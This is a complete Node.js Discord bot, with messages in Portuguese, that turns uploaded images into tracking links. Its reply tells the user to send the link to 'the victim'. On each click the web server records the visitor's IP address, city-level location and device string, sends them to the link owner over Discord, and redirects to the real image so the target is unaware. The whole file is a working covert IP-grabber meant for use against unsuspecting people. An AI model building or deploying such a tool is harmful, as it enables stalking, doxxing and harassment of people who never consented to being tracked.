const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const geoip = require('geoip-lite');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const app = express();
const links = {};

// Comandos
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  
  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;
  
  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  
  // !ping
  if (cmd === 'ping') {
    return message.reply(`🏓 Ping: ${Date.now() - message.createdTimestamp}ms`);
  }
  
  // !gerar
  if (cmd === 'gerar') {
    client.awaitingImage = client.awaitingImage || {};
    client.awaitingImage[message.author.id] = true;
    return message.reply('📤 Envie a imagem agora (você tem 30 segundos)');
  }
  
  // !logs
  if (cmd === 'logs') {
    const channel = message.mentions.channels.first() || message.channel;
    links[message.author.id] = links[message.author.id] || {};
    links[message.author.id].logChannel = channel.id;
    return message.reply(`✅ Logs vão para: ${channel}`);
  }
  
  // !manager
  if (cmd === 'manager') {
    const userLinks = Object.entries(links)
      .filter(([id, data]) => id.startsWith(message.author.id) || data.owner === message.author.id);
    
    if (userLinks.length === 0) {
      return message.reply('❌ Você não tem links');
    }
    
    let msg = '**Seus links:**\n';
    userLinks.forEach(([id, data]) => {
      msg += `\n🔗 ID: \`${id.substring(0, 8)}\` | Clicks: ${data.clicks || 0}`;
    });
    return message.reply(msg);
  }
});

// Captura imagem após !gerar
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!client.awaitingImage?.[message.author.id]) return;
  
  const attachment = message.attachments.first();
  if (!attachment || !attachment.contentType?.startsWith('image/')) {
    delete client.awaitingImage[message.author.id];
    return message.reply('❌ Isso não é uma imagem!');
  }
  
  const id = uuidv4().split('-')[0];
  const domain = process.env.DOMAIN || `http://localhost:${process.env.PORT || 3000}`;
  
  links[id] = {
    url: attachment.url,
    owner: message.author.id,
    clicks: 0,
    logs: [],
    created: new Date()
  };
  
  delete client.awaitingImage[message.author.id];
  
  message.reply(
    `✅ **Link gerado!**\n\n` +
    `🔗 \`${domain}/i/${id}\`\n\n` +
    `Manda esse link pra vítima. Quando clicar, você recebe os dados!`
  );
});

// Servidor web (tracking)
app.get('/i/:id', async (req, res) => {
  const link = links[req.params.id];
  if (!link) return res.send('Link inválido');
  
  // Coleta dados
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
  const geo = geoip.lookup(ip);
  
  const log = {
    ip: ip,
    location: geo ? `${geo.city}, ${geo.region}, ${geo.country}` : 'Desconhecido',
    userAgent: req.headers['user-agent'],
    time: new Date().toLocaleString('pt-BR')
  };
  
  link.clicks++;
  link.logs.push(log);
  
  // Envia log pro Discord
  const channelId = links[link.owner]?.logChannel;
  if (channelId) {
    const channel = await client.channels.fetch(channelId).catch(() => null);
    if (channel) {
      channel.send(
        `📸 **NOVO CLICK!**\n\n` +
        `🌍 IP: \`${log.ip}\`\n` +
        `📍 Local: ${log.location}\n` +
        `💻 Device: ${log.userAgent?.split(')')[0]})}\n` +
        `⏰ Horário: ${log.time}`
      );
    }
  }
  
  // Envia DM pro dono
  try {
    const owner = await client.users.fetch(link.owner);
    owner.send(
      `📸 Alguém clicou!\n\n` +
      `IP: \`${log.ip}\`\n` +
      `Local: ${log.location}\n` +
      `Horário: ${log.time}`
    );
  } catch (e) {}
  
  // Redireciona pra imagem real
  res.redirect(link.url);
});

// Health check
app.get('/', (req, res) => res.send('Bot online!'));

// Inicia
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Servidor: ${PORT}`));

client.login(process.env.DISCORD_TOKEN);
console.log('🤖 Bot iniciando...');
